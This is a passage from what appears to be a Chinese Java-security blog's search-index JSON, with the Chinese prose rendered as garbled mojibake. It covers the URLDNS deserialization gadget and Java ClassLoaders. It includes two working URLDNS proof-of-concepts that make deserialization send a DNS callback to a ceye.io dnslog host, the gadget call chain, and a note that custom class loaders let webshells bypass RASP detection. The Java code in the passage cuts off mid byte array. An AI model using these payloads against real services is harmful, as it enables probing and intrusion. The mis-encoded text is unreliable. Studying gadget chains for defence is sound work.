ä¸­æ–¹æ³•åä¸ä¸€æ ·ï¼Œç»†èŠ‚ä¹Ÿä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä¸å…·æœ‰é€šç”¨æ€§ï¼‰ ä½¿ç”¨HashMapçš„putæ–¹æ³•ï¼Œå°†URLå¯¹è±¡æ”¾åˆ°HashMapçš„Keyä¹‹å‰ï¼Œå…ˆå¯¹å…¶hashcodeè¿›è¡Œä¿®æ”¹ï¼Œä½¿å…¶ä¸ä¸º-1,æ”¾å…¥HashMapä¹‹åï¼Œé€šè¿‡åå°„å°†hashcodeä¿®æ”¹ä¸º-1ã€‚ ç¬¬ä¸€ç§æ€è·¯çš„ä»£ç å®ç°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class URLDNS { public static void main(String[] args) throws Exception { HashMap\u0026lt;URL, Integer\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); URL url = new URL(\u0026#34;http://reus09.zmz0xr.ceye.io\u0026#34;); Field f = Class.forName(\u0026#34;java.net.URL\u0026#34;).getDeclaredField(\u0026#34;hashCode\u0026#34;); f.setAccessible(true); f.set(url, 0x01010101); hashMap.put(url, 0); f.set(url, -1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;urldns.bin\u0026#34;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;urldns.bin\u0026#34;)); ois.readObject(); } } ç¬¬äºŒç§æ€è·¯çš„ä»£ç å®ç°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public class URLDNS2 { public static void main(String[] args) throws Exception { HashMap\u0026lt;URL, Integer\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); URL url = new URL(\u0026#34;http://reus09.zmz0xr.ceye.io\u0026#34;); Method[] m = Class.forName(\u0026#34;java.util.HashMap\u0026#34;).getDeclaredMethods(); for (Method method : m) { if (method.getName().equals(\u0026#34;putVal\u0026#34;)) { method.setAccessible(true); method.invoke(hashMap, -1, url, 0, false, true); } } ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;urldns2.bin\u0026#34;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;urldns2.bin\u0026#34;)); ois.readObject(); } } æ ¹æ®ceyeæä¾›çš„ä¸€ä¸ªdnslogå¹³å°ï¼Œæˆ‘ä»¬å¯ä»¥éªŒè¯æ˜¯å¯ä»¥æˆåŠŸè§¦å‘DNSè§£æçš„\nçœ‹ä¸€ä¸‹ysoserialå®ç°æ–¹æ³•\nå®é™…ä¸Šå°±æ˜¯ç»§æ‰¿äº†ä¸€ä¸ªURLStreamHandlerçš„ç±»ï¼Œåœ¨åˆå§‹åŒ– URL å¯¹è±¡æ—¶ä¼ å…¥ï¼Œé‚£ä¹ˆåœ¨ HashMap çš„ put æ–¹æ³•è§¦å‘çš„ hash è®¡ç®—åœ¨è°ƒç”¨åˆ° URLStreamHandler çš„getHostAddress æ–¹æ³•æ—¶å°†è°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„ SilentURLStreamHandler çš„ getHostAddressï¼Œä¸ä¼šè§¦å‘ DNS æŸ¥è¯¢ï¼Œè€Œ put ä¹‹ååˆ™æ˜¯é€šè¿‡åå°„å°† URL å¯¹è±¡çš„ hashCode çš„å€¼é‡æ–°æ”¹ä¸º -1ã€‚\næ€»ç»“ åˆ©ç”¨è¯´æ˜ï¼š è¦æ„é€ è¿™ä¸ªGadgetï¼Œåªéœ€è¦åˆå§‹åŒ–â¼€ä¸ª java.net.URL å¯¹è±¡ï¼Œä½œä¸º key æ”¾åœ¨ java.util.HashMap ä¸­ï¼›ç„¶åï¼Œè®¾ç½®è¿™ä¸ª URL å¯¹è±¡çš„ hashCode ä¸ºåˆå§‹å€¼ -1 ï¼Œè¿™æ ·ååºåˆ—åŒ–æ—¶å°†ä¼šé‡æ–°è®¡ç®— å…¶ hashCode ï¼Œæ‰èƒ½è§¦å‘åˆ°åâ¾¯çš„DNSè¯·æ±‚ï¼Œå¦åˆ™ä¸ä¼šè°ƒâ½¤ URL-\u0026gt;hashCode() ã€‚ Gadget æ€»ç»“ï¼š kick-off gadgetï¼šjava.util.HashMap#readObject() sink gadgetï¼šjava.net.URL#hashCode() chain gadgetï¼šæ—  è°ƒç”¨é“¾å±•ç¤ºï¼š 1 2 3 4 5 6 7 8 HashMap.readObject() HashMap.put() HashMap.putVal() HashMap.hash() URL.hashCode() URLStreamHandler.hashCode() URLStreamHandler.getHostAddress() InetAddress.getByName() ","permalink":"http://www.reus09.top/posts/tech/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86urldns/","summary":"è·Ÿç€su18å¸ˆå‚…å’Œpç¥ç»§ç»­å­¦ä¹ Javaå®‰å…¨ï¼Œåœ¨ä¹‹å‰å¯¹FastJsonçš„åˆ†æä¸­ï¼ŒFastJsonçš„åºåˆ—åŒ–æ¼æ´ä¸»è¦æ˜¯å¯¹å¯¹è±¡ååºåˆ—åŒ–è¿‡ç¨‹ä¸­gett","title":"Javaååºåˆ—åŒ–æ¼æ´(ä¸€) å‰ç½®çŸ¥è¯†\u0026URLDNS"},{"content":"è¿™ç¯‡ä¸»è¦è®°å½•ä¸€ä¸‹å¯¹äºclassloaderçš„å­¦ä¹ ã€‚\nç±»åŠ è½½æœºåˆ¶ Javaä¸­çš„æºç .javaåç¼€æ–‡ä»¶ä¼šåœ¨è¿è¡Œå‰è¢«ç¼–è¯‘æˆ.classåç¼€æ–‡ä»¶ï¼Œæ–‡ä»¶å†…çš„å­—èŠ‚ç çš„æœ¬è´¨å°±æ˜¯ä¸€ä¸ªå­—èŠ‚æ•°ç»„ ï¼Œå®ƒæœ‰ç‰¹å®šçš„å¤æ‚çš„å†…éƒ¨æ ¼å¼ï¼ŒJavaç±»åˆå§‹åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨java.lang.ClassLoaderåŠ è½½å­—èŠ‚ç ï¼Œ.classæ–‡ä»¶ä¸­ä¿å­˜ç€Javaä»£ç ç»è½¬æ¢åçš„è™šæ‹ŸæœºæŒ‡ä»¤ï¼Œå½“éœ€è¦ä½¿ç”¨æŸä¸ªç±»æ—¶ï¼Œè™šæ‹Ÿæœºå°†ä¼šåŠ è½½å®ƒçš„.classæ–‡ä»¶ï¼Œå¹¶åˆ›å»ºå¯¹åº”çš„classå¯¹è±¡ï¼Œå°†classæ–‡ä»¶åŠ è½½åˆ°è™šæ‹Ÿæœºçš„å†…å­˜ï¼Œè€Œåœ¨JVMä¸­ç±»çš„æŸ¥æ‰¾ä¸è£…è½½å°±æ˜¯ç”±ClassLoaderå®Œæˆçš„ï¼Œè€Œç¨‹åºåœ¨å¯åŠ¨çš„æ—¶å€™ï¼Œå¹¶ä¸ä¼šä¸€æ¬¡æ€§åŠ è½½ç¨‹åºæ‰€è¦ç”¨çš„æ‰€æœ‰classæ–‡ä»¶ï¼Œè€Œæ˜¯æ ¹æ®ç¨‹åºçš„éœ€è¦ï¼Œæ¥åŠ¨æ€åŠ è½½æŸä¸ªclassæ–‡ä»¶åˆ°å†…å­˜å½“ä¸­çš„ï¼Œä»è€Œåªæœ‰classæ–‡ä»¶è¢«è½½å…¥åˆ°äº†å†…å­˜ä¹‹åï¼Œæ‰èƒ½è¢«å…¶å®ƒclassæ‰€å¼•ç”¨ã€‚æ‰€ä»¥ClassLoaderå°±æ˜¯ç”¨æ¥åŠ¨æ€åŠ è½½classæ–‡ä»¶åˆ°å†…å­˜å½“ä¸­ç”¨çš„ã€‚\nJVMæ¶æ„å›¾\nå¯¹äºç»™å®šä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.reus.classloader; /** * @ClassName TestHelloWorld * @Description TODO * @Author reus09 * @Date 2022/10/18 20:01 * @Version 1.0 **/ public class TestHelloWorld { public String hello(){ return \u0026#34;hello world\u0026#34;; } } é€šè¿‡javac TestHelloWorld.java ç¼–è¯‘ç”Ÿæˆclassæ–‡ä»¶ã€‚\næŸ¥çœ‹åæ±‡ç¼–æŒ‡ä»¤å’ŒäºŒè¿›åˆ¶å†…å­˜å¦‚ä¸‹:\nJVMåœ¨æ‰§è¡ŒTestHelloWorldä¹‹å‰ä¼šå…ˆè§£æclassäºŒè¿›åˆ¶å†…å®¹ï¼ŒJVMæ‰§è¡Œçš„å…¶å®å°±æ˜¯å¦‚ä¸Šjavapå‘½ä»¤ç”Ÿæˆçš„å­—èŠ‚ç ã€‚\nç±»åŠ è½½æ–¹å¼ ä¹‹å‰åœ¨pç¥çš„Javaå®‰å…¨æ¼«è°ˆä¸­è®²åˆ°åå°„çš„Class.forName(),è¿™ç§å±äºæ˜¾ç¤ºåŠ è½½ç±»ï¼Œéšå¼åŠ è½½ç±»é€šè¿‡ClassLoaderæ¥åŠ¨æ€åŠ è½½ï¼Œnew ä¸€ä¸ªç±»æˆ–è€…ç±»å.æ–¹æ³•åè¿”å›ä¸€ä¸ªç±»\nä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 @Test public void loadClassTest() throws Exception { //1ã€åå°„åŠ è½½ Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); System.out.println(aClass.getName()); //2ã€ClassLoaderåŠ è½½ Class\u0026lt;?\u0026gt; aClass1 = ClassLoader.getSystemClassLoader().loadClass(\u0026#34;java.lang.ProcessBuilder\u0026#34;); System.out.println(aClass1.getName()); } é‚£ä¹Ÿå°±æ˜¯å…¶å®å¯ä»¥é€šè¿‡ClassLoader.loadClass()ä»£æ›¿Class.forName()æ¥è·å–æŸä¸ªç±»çš„classå¯¹è±¡ã€‚\nä½†æ˜¯ClassLoader.loadClass()çš„ä½œç”¨å’ŒClass.forName()ä¸­initalize=flaseä¸€æ ·ï¼Œæ— æ³•è¿›è¡Œç±»åŠ è½½è¿‡ç¨‹ä¸­çš„é“¾æ¥è¿‡ç¨‹ï¼Œè‡ªç„¶æ— æ³•è¿›è¡Œé™æ€æ–¹æ³•ã€é™æ€ä»£ç å—çš„åˆå§‹åŒ–ã€‚\nClassLoader ä¸€åˆ‡çš„Javaç±»éƒ½å¿…é¡»ç»è¿‡JVMåŠ è½½åæ‰èƒ½è¿è¡Œï¼Œè€ŒClassLoaderçš„ä¸»è¦ä½œç”¨å°±æ˜¯Javaç±»æ–‡ä»¶çš„åŠ è½½ã€‚åœ¨JVMç±»åŠ è½½å™¨ä¸­æœ€é¡¶å±‚çš„æ˜¯Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰ã€Extension ClassLoaderï¼ˆæ‰©å±•ç±»åŠ è½½å™¨ï¼‰ã€App ClassLoaderï¼ˆç³»ç»Ÿç±»åŠ è½½å™¨ï¼‰ï¼ŒAppClassLoaderæ˜¯é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œå¦‚æœç±»åŠ è½½æ—¶æˆ‘ä»¬ä¸æŒ‡å®šç±»åŠ è½½å™¨çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ä¼šä½¿ç”¨AppClassLoaderåŠ è½½ç±»ï¼ŒClassLoader.getSystemClassLoader()è¿”å›çš„ç³»ç»Ÿç±»åŠ è½½å™¨ä¹Ÿæ˜¯AppClassLoaderã€‚\nå€¼å¾—æ³¨æ„çš„æ˜¯æŸäº›æ—¶å€™æˆ‘ä»¬è·å–ä¸€ä¸ªç±»çš„ç±»åŠ è½½å™¨æ—¶å€™å¯èƒ½ä¼šè¿”å›ä¸€ä¸ªnullå€¼ï¼Œå¦‚:java.io.File.class.getClassLoader()å°†è¿”å›ä¸€ä¸ªnullå¯¹è±¡ï¼Œå› ä¸ºjava.io.Fileç±»åœ¨JVMåˆå§‹åŒ–çš„æ—¶å€™ä¼šè¢«Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰åŠ è½½ï¼ˆè¯¥ç±»åŠ è½½å™¨å®ç°äºJVMå±‚ï¼Œé‡‡ç”¨C++ç¼–å†™ï¼‰ï¼Œæˆ‘ä»¬åœ¨å°è¯•è·å–è¢«Bootstrap ClassLoaderç±»åŠ è½½å™¨æ‰€åŠ è½½çš„ç±»çš„ClassLoaderæ—¶å€™éƒ½ä¼šè¿”å›nullã€‚\nClassLoaderç±»æœ‰å¦‚ä¸‹æ ¸å¿ƒæ–¹æ³•ï¼š\nloadClassï¼ˆåŠ è½½æŒ‡å®šçš„Javaç±»ï¼‰ findClassï¼ˆæŸ¥æ‰¾æŒ‡å®šçš„Javaç±»ï¼‰ findLoadedClassï¼ˆæŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±»ï¼‰ defineClassï¼ˆå®šä¹‰ä¸€ä¸ªJavaç±»ï¼‰ resolveClassï¼ˆé“¾æ¥æŒ‡å®šçš„Javaç±»ï¼‰ ClassLoaderç±»åŠ è½½è¿‡ç¨‹ ClassLoaderåŠ è½½com.reus09.classloader.TestHelloWorldç±»é‡è¦æµç¨‹å¦‚ä¸‹ï¼š\nClassLoaderä¼šè°ƒç”¨public Class\u0026lt;?\u0026gt; loadClass(String name)æ–¹æ³•åŠ è½½com.anbai.sec.classloader.TestHelloWorldç±»ã€‚ è°ƒç”¨findLoadedClassæ–¹æ³•æ£€æŸ¥TestHelloWorldç±»æ˜¯å¦å·²ç»åˆå§‹åŒ–ï¼Œå¦‚æœJVMå·²åˆå§‹åŒ–è¿‡è¯¥ç±»åˆ™ç›´æ¥è¿”å›ç±»å¯¹è±¡ã€‚ å¦‚æœåˆ›å»ºå½“å‰ClassLoaderæ—¶ä¼ å…¥äº†çˆ¶ç±»åŠ è½½å™¨ï¼ˆnew ClassLoader(çˆ¶ç±»åŠ è½½å™¨)ï¼‰å°±ä½¿ç”¨çˆ¶ç±»åŠ è½½å™¨åŠ è½½TestHelloWorldç±»ï¼Œå¦åˆ™ä½¿ç”¨JVMçš„Bootstrap ClassLoaderåŠ è½½ã€‚ å¦‚æœä¸Šä¸€æ­¥æ— æ³•åŠ è½½TestHelloWorldç±»ï¼Œé‚£ä¹ˆè°ƒç”¨è‡ªèº«çš„findClassæ–¹æ³•å°è¯•åŠ è½½TestHelloWorldç±»ã€‚ å¦‚æœå½“å‰çš„ClassLoaderæ²¡æœ‰é‡å†™äº†findClassæ–¹æ³•ï¼Œé‚£ä¹ˆç›´æ¥è¿”å›ç±»åŠ è½½å¤±è´¥å¼‚å¸¸ã€‚å¦‚æœå½“å‰ç±»é‡å†™äº†findClassæ–¹æ³•å¹¶é€šè¿‡ä¼ å…¥çš„com.anbai.sec.classloader.TestHelloWorldç±»åæ‰¾åˆ°äº†å¯¹åº”çš„ç±»å­—èŠ‚ç ï¼Œé‚£ä¹ˆåº”è¯¥è°ƒç”¨defineClassæ–¹æ³•å»JVMä¸­æ³¨å†Œè¯¥ç±»ã€‚ å¦‚æœè°ƒç”¨loadClassçš„æ—¶å€™ä¼ å…¥çš„resolveå‚æ•°ä¸ºtrueï¼Œé‚£ä¹ˆè¿˜éœ€è¦è°ƒç”¨resolveClassæ–¹æ³•é“¾æ¥ç±»ï¼Œé»˜è®¤ä¸ºfalseã€‚ è¿”å›ä¸€ä¸ªè¢«JVMåŠ è½½åçš„java.lang.Classç±»å¯¹è±¡ã€‚ ç®€è€Œè¨€ä¹‹ï¼ŒåŠ è½½è¿‡ç¨‹å°±æ˜¯å…ˆæ£€æŸ¥jvmæ˜¯å¦å·²åˆå§‹åŒ–ï¼Œç„¶åæ£€æŸ¥ç”¨ä»€ä¹ˆåŠ è½½å™¨è¿›è¡ŒåŠ è½½ï¼Œæœ€åéƒ½ä¸è¡Œçš„è¯å°±ç”¨findClassæ–¹æ³•è¿›è¡ŒåŠ è½½ã€‚\nåŒæ—¶ï¼Œè¿™é‡Œè®²ä¸€ä¸‹classloaderåŠ è½½è¿‡ç¨‹ä¸­çš„åŒäº²å§”æ´¾æœºåˆ¶\nåŒäº²å§”æ´¾ç®€å•ç†è§£ï¼šå‘ä¸Šå§”æ´¾ï¼Œå‘ä¸‹åŠ è½½\nå½“ä¸€ä¸ª.classæ–‡ä»¶è¦è¢«åŠ è½½æ—¶ã€‚ä¸è€ƒè™‘æˆ‘ä»¬è‡ªå®šä¹‰ç±»åŠ è½½å™¨ï¼Œé¦–å…ˆä¼šåœ¨AppClassLoaderä¸­æ£€æŸ¥æ˜¯å¦åŠ è½½è¿‡ï¼Œå¦‚æœæœ‰é‚£å°±æ— éœ€å†åŠ è½½äº†ã€‚å¦‚æœæ²¡æœ‰ï¼Œé‚£ä¹ˆä¼šæ‹¿åˆ°çˆ¶åŠ è½½å™¨ï¼Œç„¶åè°ƒç”¨çˆ¶åŠ è½½å™¨çš„loadClassæ–¹æ³•ã€‚çˆ¶ç±»ä¸­åŒç†ä¹Ÿä¼šå…ˆæ£€æŸ¥è‡ªå·±æ˜¯å¦å·²ç»åŠ è½½è¿‡ï¼Œå¦‚æœæ²¡æœ‰å†å¾€ä¸Šã€‚æ³¨æ„è¿™ä¸ªç±»ä¼¼é€’å½’çš„è¿‡ç¨‹ï¼Œç›´åˆ°åˆ°è¾¾Bootstrap classLoaderä¹‹å‰ï¼Œéƒ½æ˜¯åœ¨æ£€æŸ¥æ˜¯å¦åŠ è½½è¿‡ï¼Œå¹¶ä¸ä¼šé€‰æ‹©è‡ªå·±å»åŠ è½½ã€‚ç›´åˆ°BootstrapClassLoaderï¼Œå·²ç»æ²¡æœ‰çˆ¶åŠ è½½å™¨äº†ï¼Œè¿™æ—¶å€™å¼€å§‹è€ƒè™‘è‡ªå·±æ˜¯å¦èƒ½åŠ è½½äº†ï¼ˆå‘ä¸Šå§”æ´¾ï¼‰; å¦‚æœè‡ªå·±æ— æ³•åŠ è½½ï¼Œä¼šä¸‹æ²‰åˆ°å­åŠ è½½å™¨å»åŠ è½½ï¼Œä¸€ç›´åˆ°æœ€åº•å±‚ï¼ˆå‘ä¸‹åŠ è½½ï¼‰ã€‚å¦‚æœæ²¡æœ‰ä»»ä½•åŠ è½½å™¨èƒ½åŠ è½½ï¼Œå°±ä¼šæŠ›å‡ºClassNotFoundExceptionå¼‚å¸¸ã€‚\nè‡ªå®šä¹‰classloader java.lang.ClassLoaderæ˜¯æ‰€æœ‰çš„ç±»åŠ è½½å™¨çš„çˆ¶ç±»ï¼Œjava.lang.ClassLoaderæœ‰éå¸¸å¤šçš„å­ç±»åŠ è½½å™¨ï¼Œæ¯”å¦‚æˆ‘ä»¬ç”¨äºåŠ è½½jaråŒ…çš„java.net.URLClassLoaderå…¶æœ¬èº«é€šè¿‡ç»§æ‰¿java.lang.ClassLoaderç±»ï¼Œé‡å†™äº†findClassæ–¹æ³•ä»è€Œå®ç°äº†åŠ è½½ç›®å½•classæ–‡ä»¶ç”šè‡³æ˜¯è¿œç¨‹èµ„æºæ–‡ä»¶ã€‚\næ—¢ç„¶å·²çŸ¥ClassLoaderå…·å¤‡äº†åŠ è½½ç±»çš„èƒ½åŠ›ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸å¦¨å°è¯•ä¸‹å†™ä¸€ä¸ªè‡ªå·±çš„ç±»åŠ è½½å™¨æ¥å®ç°åŠ è½½è‡ªå®šä¹‰çš„å­—èŠ‚ç ï¼ˆè¿™é‡Œä»¥åŠ è½½TestHelloWorldç±»ä¸ºä¾‹ï¼‰å¹¶è°ƒç”¨helloæ–¹æ³•ã€‚\nå¦‚æœcom.reus09.classloader.TestHelloWorldç±»å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç å³å¯å®ç°è°ƒç”¨helloæ–¹æ³•å¹¶è¾“å‡ºï¼š\n1 2 3 TestHelloWorld t = new TestHelloWorld(); String str = t.hello(); System.out.println(str); ä½†æ˜¯å¦‚æœcom.reus09.classloader.TestHelloWorldæ ¹æœ¬å°±ä¸å­˜åœ¨äºæˆ‘ä»¬çš„classpathï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨é‡å†™findClassæ–¹æ³•ï¼Œç„¶ååœ¨è°ƒç”¨defineClassæ–¹æ³•çš„æ—¶å€™ä¼ å…¥TestHelloWorldç±»çš„å­—èŠ‚ç çš„æ–¹å¼æ¥å‘JVMä¸­å®šä¹‰ä¸€ä¸ªTestHelloWorldç±»ï¼Œæœ€åé€šè¿‡åå°„æœºåˆ¶å°±å¯ä»¥è°ƒç”¨TestHelloWorldç±»çš„helloæ–¹æ³•äº†ã€‚\nå…³é”®æ˜¯é‡å†™findClassä»¥åŠdefineClassçš„å‚æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package com.reus.classloader; import java.io.IOException; import java.lang.reflect.Member; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; import java.util.Arrays; /** * @ClassName TestClassloader * @Description TODO * @Author reus09 * @Date 2022/10/18 20:06 * @Version 1.0 **/ public class TestClassloader extends ClassLoader{ private static String testClassName = \u0026#34;com.reus.classloader.TestHelloWorld\u0026#34;; private static byte[] testClassBytes = new byte[] { -54, -2, -70, -66, 0, 0, 0, 52, 0, 28, 10, 0, 6, 0, 14, 9, 0, 15, 0, 16, 8, 0, 17, 10, 0, 18, 0, 19, 7, 0, 20, 7, 0, 21, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 7, 0, 8, 7, 0, 22, 12, 0, 23, 0, 24, 1, 0, 12, 72, 101, 108, 108, 111, 32, 119, 111, 114, 108, 100, 33, 7, 0, 25, 12, 0, 26, 0, 27, 1, 0, 35, 99, 111, 109, 47, 114, 101, 117, 115, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 3, 111, 117, 116, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 1, 0, 7, 112, 114, 105, 110, 116, 108, 110, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 0, 33, 0, 5, 0, 6, 0, 0, 0, 0, 0, 2, 0, 1, 0, 7, 0, 8, 0, 1, 0, 9, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11, 0, 8, 0, 1, 0, 9, 0, 0, 0, 37, 0, 2, 0, 1, 0, 0, 0, 9, -78, 0, 2, 18, 3, -74, 0, 4, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 10, 0, 2, 0, 0, 0, 13, 0, 8, 0, 14, 0, 1, 0, 12, 0, 0, 0, 2, 0, 13 }; @Override public Class\u0026lt;?\u0026gt; findClass(String name) throws ClassNotFoundException { if (name.equals(testClassName)){ return defineClass(testClassName,testClassBytes,0,testClassBytes.length); } return super.findClass(name); } public static void main(String[] args) throws IOException { // byte[] code = Files.readAllBytes(Paths.get(\u0026#34;/Users/reus09/Desktop/JavaSec/konwledge/src/main/java/com/reus/classloader/TestHelloWorld.class\u0026#34;)); // System.out.println(Arrays.toString(code)); TestClassloader testClassloader = new TestClassloader(); try { Class testClass = testClassloader.loadClass(testClassName); Object instance = testClass.newInstance(); Method method = instance.getClass().getMethod(\u0026#34;hello\u0026#34;); String str = (String) method.invoke(instance); System.out.println(str); // Class testClass1 = Class.forName(testClassName); System.out.println(instance.getClass().getClassLoader()); Class testClass2 = ClassLoader.getSystemClassLoader().loadClass(testClassName); System.out.println(testClass2.getClassLoader()); // System.out.println(testClass1.getClassLoader()); }catch (Exception e){ e.printStackTrace(); } } } åˆ©ç”¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨æˆ‘ä»¬å¯ä»¥åœ¨webshellä¸­å®ç°åŠ è½½å¹¶è°ƒç”¨è‡ªå·±ç¼–è¯‘çš„ç±»å¯¹è±¡ï¼Œæ¯”å¦‚æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´è°ƒç”¨è‡ªå®šä¹‰ç±»å­—èŠ‚ç çš„nativeæ–¹æ³•ç»•è¿‡RASPæ£€æµ‹ï¼Œä¹Ÿå¯ä»¥ç”¨äºåŠ å¯†é‡è¦çš„Javaç±»å­—èŠ‚ç ï¼ˆåªèƒ½ç®—å¼±åŠ å¯†äº†ï¼‰ã€‚\nä¹‹ååœ¨å¾ˆå¤šååºåˆ—åŒ–æ„é€ é“¾çš„æ„é€ ä¸­ï¼Œä¹Ÿéœ€è¦ç”¨åˆ°è‡ªå®šä¹‰åŠ è½½å™¨è¿™ä¸ªç‰¹æ€§ã€‚\nç±»åŠ è½½éš”ç¦» åˆ›å»ºç±»åŠ è½½å™¨çš„æ—¶å€™å¯ä»¥æŒ‡å®šè¯¥ç±»åŠ è½½çš„çˆ¶ç±»åŠ è½½å™¨ï¼ŒClassLoaderæ˜¯æœ‰éš”ç¦»æœºåˆ¶çš„ï¼Œä¸åŒçš„ClassLoaderå¯ä»¥åŠ è½½ç›¸åŒçš„Classï¼ˆä¸¤åˆ™å¿…é¡»æ˜¯éç»§æ‰¿å…³ç³»ï¼‰ï¼ŒåŒçº§ClassLoaderè·¨ç±»åŠ è½½å™¨è°ƒç”¨æ–¹æ³•æ—¶å¿…é¡»ä½¿ç”¨åå°„ã€‚\nè·¨ç±»åŠ è½½å™¨è°ƒç”¨ç±»æ–¹æ³•æ—¶éœ€è¦ç‰¹åˆ«æ³¨æ„ä¸€ä¸ªåŸºæœ¬åŸåˆ™ï¼šClassLoader Aå’ŒClassLoader Bå¯ä»¥åŠ è½½ç›¸åŒç±»åçš„ç±»ï¼Œä½†æ˜¯ClassLoader Aä¸­çš„Class Aå’ŒClassLoader Bä¸­çš„Class Aæ˜¯å®Œå…¨ä¸åŒçš„å¯¹è±¡ï¼Œä¸¤è€…ä¹‹é—´è°ƒç”¨åªèƒ½é€šè¿‡åå°„ã€‚\nä»£ç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 package com.reus.classloader; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; /** * @ClassName TestCrossClassLoader * @Description TODO * @Author reus09 * @Date 2022/10/18 20:37 * @Version 1.0 **/ public class TestCrossClassLoader { private static String testClassName = \u0026#34;com.reus.classloader.TestHelloWorld\u0026#34;; private static byte[] testClassBytes = new byte[] { -54, -2, -70, -66, 0, 0, 0, 52, 0, 28, 10, 0, 6, 0, 14, 9, 0, 15, 0, 16, 8, 0, 17, 10, 0, 18, 0, 19, 7, 0, 20, 7, 0, 21, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 7, 0, 8, 7, 0, 22, 12, 0, 23, 0, 24, 1, 0, 12, 72, 101, 108, 108, 111, 32, 119, 111, 114, 108, 100, 33, 7, 0, 25, 12, 0, 26, 0, 27, 1, 0, 35, 99, 111, 109, 47, 114, 101, 117, 115, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 3, 111, 117, 116, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 1, 0, 7, 112, 114, 105, 110, 